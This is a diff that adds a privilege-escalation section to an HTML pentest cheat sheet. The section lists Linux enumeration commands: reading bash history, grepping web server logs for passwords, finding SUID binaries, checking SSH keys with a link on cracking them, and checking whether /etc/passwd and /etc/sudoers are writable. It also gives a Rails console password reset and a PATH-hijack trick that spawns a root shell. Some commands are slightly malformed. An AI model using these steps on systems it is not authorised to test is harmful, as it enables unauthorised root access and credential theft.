@@ -428,6 +428,136 @@ OK <br />
   </br>
 <h2 id="privilege-escalation">II. Privilege Escalation</h2>
 </br>
+      <details >
+<summary >LINENUM </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Upload Linenum's script : </summary>
+    <p > <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" class="lien2"/> Linenum </a> </p>
+</details>
+</details> 
+
+<details >
+<summary >KERNEL VERSION </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check version Kernel :  </summary>
+  <p class="command"> # cat /proc/version </p>
+  <p class="command"> # uname -r  </p>
+  <p class="command"> # hostnamectl | grep Kernel  </p>
+</details>
+</details> 
+
+        <details >
+<summary >SUDO </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check sudo permussions : </summary>
+  <p class="command"> # sudo - l </p>
+</details>
+</details>
+
+<details >
+<summary >Commad History </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check Command History : </summary>
+  <p class="command"> # history </p>
+  <p class="command"> # cat /home/user/.bash_history </p>
+</details>
+</details>
+
+<details >
+<summary >Check Logs </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check Apache2 Logs : </summary>
+  <p class="command"> cd /var/log/apache2 | ls </p>
+  <p class="command"> grep -r password_reset | grep -r login | grep -r pass </p>
+</details>
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check login Logs : </summary>
+<p class="command"> tail -f /var/log/auth.log </p>
+</details>
+ <details >
+<summary > &nbsp; &nbsp;  ➜  Check Ngnix Logs : </summary>
+<p class="command">cd /var/log/nginx/ | ls | cat * </p>
+<p class="command"> grep -r password_reset | grep -r login | grep -r pass </p>
+</details> 
+</details>
+
+<details >
+<summary >RUNNING SERVICE </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ List active service : </summary>
+  <p class="command"> # ps aux </p>
+</details>
+</details> 
+
+       <details >
+<summary >SUID BIT </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Find suid bit : </summary>
+  <p class="command"> # find / -perm /4000 2>>/dev/null </p>
+</details>
+</details> 
+
+       <details >
+<summary >SSH</summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Checking for existing id_rsa :  </summary>
+  <p class="command"> # ls -al ~/.ssh [check for all Users]  </p>
+  <p > <a href="https://www.abhizer.com/crack-ssh-with-john" target="_blank" class="lien2"/> crack id_rsa </a> </p>
+</details>
+</details>
+
+
+       <details >
+<summary >CronTab</summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Checking crontab jobs :  </summary>
+  <p class="command"> # crontab –l  </p>
+  <p class="command"> # crontab –u 'username' –l </p>
+    <p class="command"> # cat /etc/crontab </p>
+</details>
+</details>
+
+ <details >
+<summary >CHECK WRITE PERMISSION</summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Checking for /etc/passwd :  </summary>
+  <p class="command"> # find /etc/passwd -writable -type f  2> /dev/null </p>
+   </details>
+  <details >
+  <summary > &nbsp; &nbsp;  ➜ Checking for /etc/sudoers :  </summary>
+    <p class="command"> # find /etc/sudoers -writable -type f  2> /dev/null </p>
+  </details>
+</details>
+
+
+       <details >
+<summary >Rails Console-Ruby</summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ Change User password :  </summary>
+  <p class="command">  </br>
+    u = User.find_by_id(1) </br>
+u.password = "a_stupid_pa$$word"</br>
+u.password_confirmation = "a_stupid_pa$$word"</br>
+u.save </p>
+  <p > <a href="https://jjasghar.github.io/blog/2014/05/02/updating-a-rails-password-via-the-rails-console " target="_blank" class="lien2"/> Change User Pass</a> </p>
+</details>
+</details>
+
+
+       <details >
+<summary > Path exploitation </summary>
+<details >
+<summary > &nbsp; &nbsp;  ➜ SUID File Call chmod variable  </summary>
+<p class="command">
+cd /tmp/  </br>
+echo "/bin/bash" > chmod </br>
+chmod +x chmod </br>
+export PATH=/tmp:$PATH</br>
+And execute Suid file </p>
+  <p > <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" class="lien2"/> Path Exploitation</a> </p>
+</details>
+</details>
+
 <h2 id="clean-step">III. Clean Step</h2>
 </br>
 
